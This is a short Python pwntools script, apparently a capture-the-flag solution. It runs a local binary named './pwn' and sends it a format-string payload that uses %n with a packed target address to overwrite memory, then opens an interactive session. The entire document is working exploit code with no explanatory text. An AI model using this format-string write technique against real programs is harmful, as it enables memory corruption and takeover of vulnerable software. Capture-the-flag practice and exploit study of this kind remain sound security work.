from pwn import *

context.log_level = "debug"

r = process("./pwn")
r.recvuntil(b":")
r.send(b"1111111%13$n" + p32(0x804C044))
r.recv()
r.send(b"7")
r.interactive()
